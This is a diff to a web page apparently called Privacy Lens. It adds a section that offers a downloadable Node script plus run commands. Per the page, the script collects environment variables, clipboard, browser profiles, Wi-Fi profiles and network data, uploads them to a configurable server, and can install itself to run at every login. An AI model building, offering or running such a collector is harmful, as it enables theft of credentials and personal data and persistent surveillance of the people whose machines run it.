@@ -97,6 +97,30 @@
     <div id="signals" class="signal-grid"></div>
   </section>
 
+  <section class="card local-collector" id="localCollector">
+    <div class="main-head">
+      <div>
+        <div class="section-label">LOCAL PC COLLECTOR</div>
+        <h2>Companion CLI</h2>
+      </div>
+      <span class="pill">Standalone</span>
+    </div>
+    <p class="profile-hint">Run the local collector script on this machine to capture system data, network info, Wi-Fi profiles, environment variables, clipboard, browser profiles, and more — all uploaded to the same database.</p>
+    <div class="local-actions">
+      <a href="/collect-local.mjs" download class="button primary">Download Script</a>
+      <button id="showLocalInstructions" class="text-button">Usage</button>
+    </div>
+    <div id="localInstructions" class="local-instructions" hidden>
+      <div class="code-block">node "C:\path\to\downloads\collect-local.mjs"</div>
+      <p class="access-detail">Run the command above in a terminal to collect and upload local PC data.</p>
+      <div class="code-block" style="margin-top:12px">node collect-local.mjs --install</div>
+      <p class="access-detail">Run with <code>--install</code> to auto-start at system login (scheduled task).</p>
+      <p class="access-detail" style="margin-top:8px;color:var(--muted);font-size:11px">
+        Override server: <code>set COLLECT_SERVER=https://your-server.com &amp;&amp; node collect-local.mjs</code>
+      </p>
+    </div>
+  </section>
+
   <footer class="footer">
     <span>Privacy Lens</span>
     <div>
